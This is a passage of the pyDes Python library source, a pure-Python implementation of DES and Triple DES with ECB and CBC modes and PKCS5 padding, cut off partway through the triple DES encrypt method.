b\"Please encrypt my data\"\n#   k = des(b\"DESCRYPT\", CBC, b\"\\0\\0\\0\\0\\0\\0\\0\\0\", pad=None, padmode=PAD_PKCS5)\nd = k.encrypt(data)\nprint \"Encrypted: %r\" % d\nprint \"Decrypted: %r\" % k.decrypt(d)\nassert k.decrypt(d, padmode=PAD_PKCS5) == data\n\n\nSee the module source (pyDes.py) for more examples of use.\nYou can also run the pyDes.py file without and arguments to see a simple test.\n\nNote: This code was not written for high-end systems needing a fast\n      implementation, but rather a handy portable solution with small usage.\n\n\"\"\"\n\nimport sys\n\n# _pythonMajorVersion is used to handle Python2 and Python3 differences.\n_pythonMajorVersion = sys.version_info[0]\n\n# Modes of crypting / cyphering\nECB =\t0\nCBC =\t1\n\n# Modes of padding\nPAD_NORMAL = 1\nPAD_PKCS5 = 2\n\n# PAD_PKCS5: is a method that will unambiguously remove all padding\n#            characters after decryption, when originally encrypted with\n#            this padding mode.\n# For a good description of the PKCS5 padding technique, see:\n# http://www.faqs.org/rfcs/rfc1423.html\n\n# The base class shared by des and triple des.\nclass _baseDes(object):\n\tdef __init__(self, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):\n\t\tif IV:\n\t\t\tIV = self._guardAgainstUnicode(IV)\n\t\tif pad:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tself.block_size = 8\n\t\t# Sanity checking of arguments.\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\t\tif IV and len(IV) != self.block_size:\n\t\t\traise ValueError(\"Invalid Initial Value (IV), must be a multiple of \" + str(self.block_size) + \" bytes\")\n\n\t\t# Set the passed in variables\n\t\tself._mode = mode\n\t\tself._iv = IV\n\t\tself._padding = pad\n\t\tself._padmode = padmode\n\n\tdef getKey(self):\n\t\t\"\"\"getKey() -> bytes\"\"\"\n\t\treturn self.__key\n\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object.\"\"\"\n\t\tkey = self._guardAgainstUnicode(key)\n\t\tself.__key = key\n\n\tdef getMode(self):\n\t\t\"\"\"getMode() -> pyDes.ECB or pyDes.CBC\"\"\"\n\t\treturn self._mode\n\n\tdef setMode(self, mode):\n\t\t\"\"\"Sets the type of crypting mode, pyDes.ECB or pyDes.CBC\"\"\"\n\t\tself._mode = mode\n\n\tdef getPadding(self):\n\t\t\"\"\"getPadding() -> bytes of length 1. Padding character.\"\"\"\n\t\treturn self._padding\n\n\tdef setPadding(self, pad):\n\t\t\"\"\"setPadding() -> bytes of length 1. Padding character.\"\"\"\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tself._padding = pad\n\n\tdef getPadMode(self):\n\t\t\"\"\"getPadMode() -> pyDes.PAD_NORMAL or pyDes.PAD_PKCS5\"\"\"\n\t\treturn self._padmode\n\n\tdef setPadMode(self, mode):\n\t\t\"\"\"Sets the type of padding mode, pyDes.PAD_NORMAL or pyDes.PAD_PKCS5\"\"\"\n\t\tself._padmode = mode\n\n\tdef getIV(self):\n\t\t\"\"\"getIV() -> bytes\"\"\"\n\t\treturn self._iv\n\n\tdef setIV(self, IV):\n\t\t\"\"\"Will set the Initial Value, used in conjunction with CBC mode\"\"\"\n\t\tif not IV or len(IV) != self.block_size:\n\t\t\traise ValueError(\"Invalid Initial Value (IV), must be a multiple of \" + str(self.block_size) + \" bytes\")\n\t\tIV = self._guardAgainstUnicode(IV)\n\t\tself._iv = IV\n\n\tdef _padData(self, data, pad, padmode):\n\t\t# Pad data depending on the mode\n\t\tif padmode is None:\n\t\t\t# Get the default padding mode.\n\t\t\tpadmode = self.getPadMode()\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\n\t\tif padmode == PAD_NORMAL:\n\t\t\tif len(data) % self.block_size == 0:\n\t\t\t\t# No padding required.\n\t\t\t\treturn data\n\n\t\t\tif not pad:\n\t\t\t\t# Get the default padding.\n\t\t\t\tpad = self.getPadding()\n\t\t\tif not pad:\n\t\t\t\traise ValueError(\"Data must be a multiple of \" + str(self.block_size) + \" bytes in length. Use padmode=PAD_PKCS5 or set the pad character.\")\n\t\t\tdata += (self.block_size - (len(data) % self.block_size)) * pad\n\n\t\telif padmode == PAD_PKCS5:\n\t\t\tpad_len = 8 - (len(data) % self.block_size)\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tdata += pad_len * chr(pad_len)\n\t\t\telse:\n\t\t\t\tdata += bytes([pad_len] * pad_len)\n\n\t\treturn data\n\n\tdef _unpadData(self, data, pad, padmode):\n\t\t# Unpad data depending on the mode.\n\t\tif not data:\n\t\t\treturn data\n\t\tif pad and padmode == PAD_PKCS5:\n\t\t\traise ValueError(\"Cannot use a pad character with PAD_PKCS5\")\n\t\tif padmode is None:\n\t\t\t# Get the default padding mode.\n\t\t\tpadmode = self.getPadMode()\n\n\t\tif padmode == PAD_NORMAL:\n\t\t\tif not pad:\n\t\t\t\t# Get the default padding.\n\t\t\t\tpad = self.getPadding()\n\t\t\tif pad:\n\t\t\t\tdata = data[:-self.block_size] + \\\n\t\t\t\t       data[-self.block_size:].rstrip(pad)\n\n\t\telif padmode == PAD_PKCS5:\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tpad_len = ord(data[-1])\n\t\t\telse:\n\t\t\t\tpad_len = data[-1]\n\t\t\tdata = data[:-pad_len]\n\n\t\treturn data\n\n\tdef _guardAgainstUnicode(self, data):\n\t\t# Only accept byte strings or ascii unicode values, otherwise\n\t\t# there is no way to correctly decode the data into bytes.\n\t\tif _pythonMajorVersion < 3:\n\t\t\tif isinstance(data, unicode):\n\t\t\t\traise ValueError(\"pyDes can only work with bytes, not Unicode strings.\")\n\t\telse:\n\t\t\tif isinstance(data, str):\n\t\t\t\t# Only accept ascii unicode values.\n\t\t\t\ttry:\n\t\t\t\t\treturn data.encode('ascii')\n\t\t\t\texcept UnicodeEncodeError:\n\t\t\t\t\tpass\n\t\t\t\traise ValueError(\"pyDes can only work with encoded strings, not Unicode.\")\n\t\treturn data\n\n#############################################################################\n# \t\t\t\t    DES\t\t\t\t\t    #\n#############################################################################\nclass des(_baseDes):\n\t\"\"\"DES encryption/decrytpion class\n\n\tSupports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.\n\n\tpyDes.des(key,[mode], [IV])\n\n\tkey  -> Bytes containing the encryption key, must be exactly 8 bytes\n\tmode -> Optional argument for encryption type, can be either pyDes.ECB\n\t\t(Electronic Code Book), pyDes.CBC (Cypher Block Chaining)\n\tIV   -> Optional Initial Value bytes, must be supplied if using CBC mode.\n\t\tMust be 8 bytes in length.\n\tpad  -> Optional argument, set the pad character (PAD_NORMAL) to use\n\t\tduring all encrypt/decrpt operations done with this instance.\n\tpadmode -> Optional argument, set the padding mode (PAD_NORMAL or\n\t\tPAD_PKCS5) to use during all encrypt/decrpt operations done\n\t\twith this instance.\n\t\"\"\"\n\n\n\t# Permutation and translation tables for DES\n\t__pc1 = [56, 48, 40, 32, 24, 16,  8,\n\t\t  0, 57, 49, 41, 33, 25, 17,\n\t\t  9,  1, 58, 50, 42, 34, 26,\n\t\t 18, 10,  2, 59, 51, 43, 35,\n\t\t 62, 54, 46, 38, 30, 22, 14,\n\t\t  6, 61, 53, 45, 37, 29, 21,\n\t\t 13,  5, 60, 52, 44, 36, 28,\n\t\t 20, 12,  4, 27, 19, 11,  3\n\t]\n\n\t# number left rotations of pc1\n\t__left_rotations = [\n\t\t1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1\n\t]\n\n\t# permuted choice key (table 2)\n\t__pc2 = [\n\t\t13, 16, 10, 23,  0,  4,\n\t\t 2, 27, 14,  5, 20,  9,\n\t\t22, 18, 11,  3, 25,  7,\n\t\t15,  6, 26, 19, 12,  1,\n\t\t40, 51, 30, 36, 46, 54,\n\t\t29, 39, 50, 44, 32, 47,\n\t\t43, 48, 38, 55, 33, 52,\n\t\t45, 41, 49, 35, 28, 31\n\t]\n\n\t# initial permutation IP\n\t__ip = [57, 49, 41, 33, 25, 17, 9,  1,\n\t\t59, 51, 43, 35, 27, 19, 11, 3,\n\t\t61, 53, 45, 37, 29, 21, 13, 5,\n\t\t63, 55, 47, 39, 31, 23, 15, 7,\n\t\t56, 48, 40, 32, 24, 16, 8,  0,\n\t\t58, 50, 42, 34, 26, 18, 10, 2,\n\t\t60, 52, 44, 36, 28, 20, 12, 4,\n\t\t62, 54, 46, 38, 30, 22, 14, 6\n\t]\n\n\t# Expansion table for turning 32 bit blocks into 48 bits\n\t__expansion_table = [\n\t\t31,  0,  1,  2,  3,  4,\n\t\t 3,  4,  5,  6,  7,  8,\n\t\t 7,  8,  9, 10, 11, 12,\n\t\t11, 12, 13, 14, 15, 16,\n\t\t15, 16, 17, 18, 19, 20,\n\t\t19, 20, 21, 22, 23, 24,\n\t\t23, 24, 25, 26, 27, 28,\n\t\t27, 28, 29, 30, 31,  0\n\t]\n\n\t# The (in)famous S-boxes\n\t__sbox = [\n\t\t# S1\n\t\t[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,\n\t\t 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,\n\t\t 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,\n\t\t 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],\n\n\t\t# S2\n\t\t[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,\n\t\t 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,\n\t\t 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,\n\t\t 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],\n\n\t\t# S3\n\t\t[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,\n\t\t 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,\n\t\t 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,\n\t\t 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],\n\n\t\t# S4\n\t\t[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,\n\t\t 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,\n\t\t 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,\n\t\t 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],\n\n\t\t# S5\n\t\t[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,\n\t\t 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,\n\t\t 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,\n\t\t 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],\n\n\t\t# S6\n\t\t[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,\n\t\t 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,\n\t\t 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,\n\t\t 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],\n\n\t\t# S7\n\t\t[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,\n\t\t 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,\n\t\t 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,\n\t\t 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],\n\n\t\t# S8\n\t\t[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,\n\t\t 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,\n\t\t 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,\n\t\t 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],\n\t]\n\n\n\t# 32-bit permutation function P used on the output of the S-boxes\n\t__p = [\n\t\t15, 6, 19, 20, 28, 11,\n\t\t27, 16, 0, 14, 22, 25,\n\t\t4, 17, 30, 9, 1, 7,\n\t\t23,13, 31, 26, 2, 8,\n\t\t18, 12, 29, 5, 21, 10,\n\t\t3, 24\n\t]\n\n\t# final permutation IP^-1\n\t__fp = [\n\t\t39,  7, 47, 15, 55, 23, 63, 31,\n\t\t38,  6, 46, 14, 54, 22, 62, 30,\n\t\t37,  5, 45, 13, 53, 21, 61, 29,\n\t\t36,  4, 44, 12, 52, 20, 60, 28,\n\t\t35,  3, 43, 11, 51, 19, 59, 27,\n\t\t34,  2, 42, 10, 50, 18, 58, 26,\n\t\t33,  1, 41,  9, 49, 17, 57, 25,\n\t\t32,  0, 40,  8, 48, 16, 56, 24\n\t]\n\n\t# Type of crypting being done\n\tENCRYPT =\t0x00\n\tDECRYPT =\t0x01\n\n\t# Initialisation\n\tdef __init__(self, key, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):\n\t\t# Sanity checking of arguments.\n\t\tif len(key) != 8:\n\t\t\traise ValueError(\"Invalid DES key size. Key must be exactly 8 bytes long.\")\n\t\t_baseDes.__init__(self, mode, IV, pad, padmode)\n\t\tself.key_size = 8\n\n\t\tself.L = []\n\t\tself.R = []\n\t\tself.Kn = [ [0] * 48 ] * 16\t# 16 48-bit keys (K1 - K16)\n\t\tself.final = []\n\n\t\tself.setKey(key)\n\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object. Must be 8 bytes.\"\"\"\n\t\t_baseDes.setKey(self, key)\n\t\tself.__create_sub_keys()\n\n\tdef __String_to_BitList(self, data):\n\t\t\"\"\"Turn the string data, into a list of bits (1, 0)'s\"\"\"\n\t\tif _pythonMajorVersion < 3:\n\t\t\t# Turn the strings into integers. Python 3 uses a bytes\n\t\t\t# class, which already has this behaviour.\n\t\t\tdata = [ord(c) for c in data]\n\t\tl = len(data) * 8\n\t\tresult = [0] * l\n\t\tpos = 0\n\t\tfor ch in data:\n\t\t\ti = 7\n\t\t\twhile i >= 0:\n\t\t\t\tif ch & (1 << i) != 0:\n\t\t\t\t\tresult[pos] = 1\n\t\t\t\telse:\n\t\t\t\t\tresult[pos] = 0\n\t\t\t\tpos += 1\n\t\t\t\ti -= 1\n\n\t\treturn result\n\n\tdef __BitList_to_String(self, data):\n\t\t\"\"\"Turn the list of bits -> data, into a string\"\"\"\n\t\tresult = []\n\t\tpos = 0\n\t\tc = 0\n\t\twhile pos < len(data):\n\t\t\tc += data[pos] << (7 - (pos % 8))\n\t\t\tif (pos % 8) == 7:\n\t\t\t\tresult.append(c)\n\t\t\t\tc = 0\n\t\t\tpos += 1\n\n\t\tif _pythonMajorVersion < 3:\n\t\t\treturn ''.join([ chr(c) for c in result ])\n\t\telse:\n\t\t\treturn bytes(result)\n\n\tdef __permutate(self, table, block):\n\t\t\"\"\"Permutate this block with the specified table\"\"\"\n\t\treturn list(map(lambda x: block[x], table))\n\n\t# Transform the secret key, so that it is ready for data processing\n\t# Create the 16 subkeys, K[1] - K[16]\n\tdef __create_sub_keys(self):\n\t\t\"\"\"Create the 16 subkeys K[1] to K[16] from the given key\"\"\"\n\t\tkey = self.__permutate(des.__pc1, self.__String_to_BitList(self.getKey()))\n\t\ti = 0\n\t\t# Split into Left and Right sections\n\t\tself.L = key[:28]\n\t\tself.R = key[28:]\n\t\twhile i < 16:\n\t\t\tj = 0\n\t\t\t# Perform circular left shifts\n\t\t\twhile j < des.__left_rotations[i]:\n\t\t\t\tself.L.append(self.L[0])\n\t\t\t\tdel self.L[0]\n\n\t\t\t\tself.R.append(self.R[0])\n\t\t\t\tdel self.R[0]\n\n\t\t\t\tj += 1\n\n\t\t\t# Create one of the 16 subkeys through pc2 permutation\n\t\t\tself.Kn[i] = self.__permutate(des.__pc2, self.L + self.R)\n\n\t\t\ti += 1\n\n\t# Main part of the encryption algorithm, the number cruncher :)\n\tdef __des_crypt(self, block, crypt_type):\n\t\t\"\"\"Crypt the block of data through DES bit-manipulation\"\"\"\n\t\tblock = self.__permutate(des.__ip, block)\n\t\tself.L = block[:32]\n\t\tself.R = block[32:]\n\n\t\t# Encryption starts from Kn[1] through to Kn[16]\n\t\tif crypt_type == des.ENCRYPT:\n\t\t\titeration = 0\n\t\t\titeration_adjustment = 1\n\t\t# Decryption starts from Kn[16] down to Kn[1]\n\t\telse:\n\t\t\titeration = 15\n\t\t\titeration_adjustment = -1\n\n\t\ti = 0\n\t\twhile i < 16:\n\t\t\t# Make a copy of R[i-1], this will later become L[i]\n\t\t\ttempR = self.R[:]\n\n\t\t\t# Permutate R[i - 1] to start creating R[i]\n\t\t\tself.R = self.__permutate(des.__expansion_table, self.R)\n\n\t\t\t# Exclusive or R[i - 1] with K[i], create B[1] to B[8] whilst here\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.Kn[iteration]))\n\t\t\tB = [self.R[:6], self.R[6:12], self.R[12:18], self.R[18:24], self.R[24:30], self.R[30:36], self.R[36:42], self.R[42:]]\n\t\t\t# Optimization: Replaced below commented code with above\n\t\t\t#j = 0\n\t\t\t#B = []\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.Kn[iteration][j]\n\t\t\t#\tj += 1\n\t\t\t#\tif j % 6 == 0:\n\t\t\t#\t\tB.append(self.R[j-6:j])\n\n\t\t\t# Permutate B[1] to B[8] using the S-Boxes\n\t\t\tj = 0\n\t\t\tBn = [0] * 32\n\t\t\tpos = 0\n\t\t\twhile j < 8:\n\t\t\t\t# Work out the offsets\n\t\t\t\tm = (B[j][0] << 1) + B[j][5]\n\t\t\t\tn = (B[j][1] << 3) + (B[j][2] << 2) + (B[j][3] << 1) + B[j][4]\n\n\t\t\t\t# Find the permutation value\n\t\t\t\tv = des.__sbox[j][(m << 4) + n]\n\n\t\t\t\t# Turn value into bits, add it to result: Bn\n\t\t\t\tBn[pos] = (v & 8) >> 3\n\t\t\t\tBn[pos + 1] = (v & 4) >> 2\n\t\t\t\tBn[pos + 2] = (v & 2) >> 1\n\t\t\t\tBn[pos + 3] = v & 1\n\n\t\t\t\tpos += 4\n\t\t\t\tj += 1\n\n\t\t\t# Permutate the concatination of B[1] to B[8] (Bn)\n\t\t\tself.R = self.__permutate(des.__p, Bn)\n\n\t\t\t# Xor with L[i - 1]\n\t\t\tself.R = list(map(lambda x, y: x ^ y, self.R, self.L))\n\t\t\t# Optimization: This now replaces the below commented code\n\t\t\t#j = 0\n\t\t\t#while j < len(self.R):\n\t\t\t#\tself.R[j] = self.R[j] ^ self.L[j]\n\t\t\t#\tj += 1\n\n\t\t\t# L[i] becomes R[i - 1]\n\t\t\tself.L = tempR\n\n\t\t\ti += 1\n\t\t\titeration += iteration_adjustment\n\n\t\t# Final permutation of R[16]L[16]\n\t\tself.final = self.__permutate(des.__fp, self.R + self.L)\n\t\treturn self.final\n\n\n\t# Data to be encrypted/decrypted\n\tdef crypt(self, data, crypt_type):\n\t\t\"\"\"Crypt the data in blocks, running it through des_crypt()\"\"\"\n\n\t\t# Error check the data\n\t\tif not data:\n\t\t\treturn ''\n\t\tif len(data) % self.block_size != 0:\n\t\t\tif crypt_type == des.DECRYPT: # Decryption must work on 8 byte blocks\n\t\t\t\traise ValueError(\"Invalid data length, data must be a multiple of \" + str(self.block_size) + \" bytes\\n.\")\n\t\t\tif not self.getPadding():\n\t\t\t\traise ValueError(\"Invalid data length, data must be a multiple of \" + str(self.block_size) + \" bytes\\n. Try setting the optional padding character\")\n\t\t\telse:\n\t\t\t\tdata += (self.block_size - (len(data) % self.block_size)) * self.getPadding()\n\t\t\t# print \"Len of data: %f\" % (len(data) / self.block_size)\n\n\t\tif self.getMode() == CBC:\n\t\t\tif self.getIV():\n\t\t\t\tiv = self.__String_to_BitList(self.getIV())\n\t\t\telse:\n\t\t\t\traise ValueError(\"For CBC mode, you must supply the Initial Value (IV) for ciphering\")\n\n\t\t# Split the data into blocks, crypting each one seperately\n\t\ti = 0\n\t\tdict = {}\n\t\tresult = []\n\t\t#cached = 0\n\t\t#lines = 0\n\t\twhile i < len(data):\n\t\t\t# Test code for caching encryption results\n\t\t\t#lines += 1\n\t\t\t#if dict.has_key(data[i:i+8]):\n\t\t\t\t#print \"Cached result for: %s\" % data[i:i+8]\n\t\t\t#\tcached += 1\n\t\t\t#\tresult.append(dict[data[i:i+8]])\n\t\t\t#\ti += 8\n\t\t\t#\tcontinue\n\n\t\t\tblock = self.__String_to_BitList(data[i:i+8])\n\n\t\t\t# Xor with IV if using CBC mode\n\t\t\tif self.getMode() == CBC:\n\t\t\t\tif crypt_type == des.ENCRYPT:\n\t\t\t\t\tblock = list(map(lambda x, y: x ^ y, block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(block):\n\t\t\t\t\t#\tblock[j] = block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\n\t\t\t\tif crypt_type == des.DECRYPT:\n\t\t\t\t\tprocessed_block = list(map(lambda x, y: x ^ y, processed_block, iv))\n\t\t\t\t\t#j = 0\n\t\t\t\t\t#while j < len(processed_block):\n\t\t\t\t\t#\tprocessed_block[j] = processed_block[j] ^ iv[j]\n\t\t\t\t\t#\tj += 1\n\t\t\t\t\tiv = block\n\t\t\t\telse:\n\t\t\t\t\tiv = processed_block\n\t\t\telse:\n\t\t\t\tprocessed_block = self.__des_crypt(block, crypt_type)\n\n\n\t\t\t# Add the resulting crypted block to our list\n\t\t\t#d = self.__BitList_to_String(processed_block)\n\t\t\t#result.append(d)\n\t\t\tresult.append(self.__BitList_to_String(processed_block))\n\t\t\t#dict[data[i:i+8]] = d\n\t\t\ti += 8\n\n\t\t# print \"Lines: %d, cached: %d\" % (lines, cached)\n\n\t\t# Return the full crypted string\n\t\tif _pythonMajorVersion < 3:\n\t\t\treturn ''.join(result)\n\t\telse:\n\t\t\treturn bytes.fromhex('').join(result)\n\n\tdef encrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"encrypt(data, [pad], [padmode]) -> bytes\n\n\t\tdata : Bytes to be encrypted\n\t\tpad  : Optional argument for encryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.\n\n\t\tThe data must be a multiple of 8 bytes and will be encrypted\n\t\twith the already specified key. Data does not have to be a\n\t\tmultiple of 8 bytes if the padding character is supplied, or\n\t\tthe padmode is set to PAD_PKCS5, as bytes will then added to\n\t\tensure the be padded data is a multiple of 8 bytes.\n\t\t\"\"\"\n\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tdata = self._padData(data, pad, padmode)\n\t\treturn self.crypt(data, des.ENCRYPT)\n\n\tdef decrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\n\t\tdata : Bytes to be encrypted\n\t\tpad  : Optional argument for decryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.\n\n\t\tThe data must be a multiple of 8 bytes and will be decrypted\n\t\twith the already specified key. In PAD_NORMAL mode, if the\n\t\toptional padding character is supplied, then the un-encrypted\n\t\tdata will have the padding characters removed from the end of\n\t\tthe bytes. This pad removal only occurs on the last 8 bytes of\n\t\tthe data (last data block). In PAD_PKCS5 mode, the special\n\t\tpadding end markers will be removed from the data after decrypting.\n\t\t\"\"\"\n\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tdata = self.crypt(data, des.DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)\n\n\n\n#############################################################################\n# \t\t\t\tTriple DES\t\t\t\t    #\n#############################################################################\nclass triple_des(_baseDes):\n\t\"\"\"Triple DES encryption/decrytpion class\n\n\tThis algorithm uses the DES-EDE3 (when a 24 byte key is supplied) or\n\tthe DES-EDE2 (when a 16 byte key is supplied) encryption methods.\n\tSupports ECB (Electronic Code Book) and CBC (Cypher Block Chaining) modes.\n\n\tpyDes.des(key, [mode], [IV])\n\n\tkey  -> Bytes containing the encryption key, must be either 16 or\n\t        24 bytes long\n\tmode -> Optional argument for encryption type, can be either pyDes.ECB\n\t\t(Electronic Code Book), pyDes.CBC (Cypher Block Chaining)\n\tIV   -> Optional Initial Value bytes, must be supplied if using CBC mode.\n\t\tMust be 8 bytes in length.\n\tpad  -> Optional argument, set the pad character (PAD_NORMAL) to use\n\t\tduring all encrypt/decrpt operations done with this instance.\n\tpadmode -> Optional argument, set the padding mode (PAD_NORMAL or\n\t\tPAD_PKCS5) to use during all encrypt/decrpt operations done\n\t\twith this instance.\n\t\"\"\"\n\tdef __init__(self, key, mode=ECB, IV=None, pad=None, padmode=PAD_NORMAL):\n\t\t_baseDes.__init__(self, mode, IV, pad, padmode)\n\t\tself.setKey(key)\n\n\tdef setKey(self, key):\n\t\t\"\"\"Will set the crypting key for this object. Either 16 or 24 bytes long.\"\"\"\n\t\tself.key_size = 24  # Use DES-EDE3 mode\n\t\tif len(key) != self.key_size:\n\t\t\tif len(key) == 16: # Use DES-EDE2 mode\n\t\t\t\tself.key_size = 16\n\t\t\telse:\n\t\t\t\traise ValueError(\"Invalid triple DES key size. Key must be either 16 or 24 bytes long\")\n\t\tif self.getMode() == CBC:\n\t\t\tif not self.getIV():\n\t\t\t\t# Use the first 8 bytes of the key\n\t\t\t\tself._iv = key[:self.block_size]\n\t\t\tif len(self.getIV()) != self.block_size:\n\t\t\t\traise ValueError(\"Invalid IV, must be 8 bytes in length\")\n\t\tself.__key1 = des(key[:8], self._mode, self._iv,\n\t\t\t\t  self._padding, self._padmode)\n\t\tself.__key2 = des(key[8:16], self._mode, self._iv,\n\t\t\t\t  self._padding, self._padmode)\n\t\tif self.key_size == 16:\n\t\t\tself.__key3 = self.__key1\n\t\telse:\n\t\t\tself.__key3 = des(key[16:], self._mode, self._iv,\n\t\t\t\t\t  self._padding, self._padmode)\n\t\t_baseDes.setKey(self, key)\n\n\t# Override setter methods to work on all 3 keys.\n\n\tdef setMode(self, mode):\n\t\t\"\"\"Sets the type of crypting mode, pyDes.ECB or pyDes.CBC\"\"\"\n\t\t_baseDes.setMode(self, mode)\n\t\tfor key in (self.__key1, self.__key2, self.__key3):\n\t\t\tkey.setMode(mode)\n\n\tdef setPadding(self, pad):\n\t\t\"\"\"setPadding() -> bytes of length 1. Padding character.\"\"\"\n\t\t_baseDes.setPadding(self, pad)\n\t\tfor key in (self.__key1, self.__key2, self.__key3):\n\t\t\tkey.setPadding(pad)\n\n\tdef setPadMode(self, mode):\n\t\t\"\"\"Sets the type of padding mode, pyDes.PAD_NORMAL or pyDes.PAD_PKCS5\"\"\"\n\t\t_baseDes.setPadMode(self, mode)\n\t\tfor key in (self.__key1, self.__key2, self.__key3):\n\t\t\tkey.setPadMode(mode)\n\n\tdef setIV(self, IV):\n\t\t\"\"\"Will set the Initial Value, used in conjunction with CBC mode\"\"\"\n\t\t_baseDes.setIV(self, IV)\n\t\tfor key in (self.__key1, self.__key2, self.__key3):\n\t\t\tkey.setIV(IV)\n\n\tdef encrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"encrypt(data, [pad], [padmode]) -> bytes\n\n\t\tdata : bytes to be encrypted\n\t\tpad  : Optional argument for encryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.\n\n\t\tThe data must be a multiple of 8 bytes and will be encrypted\n\t\twith the already specified key. Data does not have to be a\n\t\tmultiple of 8 bytes if the padding character is supplied, or\n\t\tthe padmode is set to PAD_PKCS5, as bytes will then added to\n\t\tensure the be padded data is a multiple of 8 bytes.\n\t\t\"\"\"\n\t\tENCRYPT = des.ENCRYPT\n\t\tDECRYPT = des.DECRYPT\n\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\t# Pad the data accordingly.\n\t\tdata = self._padData(data, pad, padmode)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0\n\t\t\tresult = []\n\t\t\twhile i < len(data):\n\t\t\t\tblock = self.__key1.crypt(data[i:i+8], ENCRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, DECRYPT)\n\t\t\t\tblock = self.__key3.crypt(block, ENCRYPT)\n\t\t\t\tself.__key1.setIV(block)\n\t\t\t\tself.__key2.setIV(block)\n\t\t\t\tself.__key3.setIV(block)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\treturn ''.join(result)\n\t\t\telse:\n\t\t\t\treturn bytes.fromhex('').join(result)\n\t\telse:\n\t\t\tdata = self.__key1.crypt(data, ENCRYPT)\n\t\t\tdata = self.__key2.crypt(data, 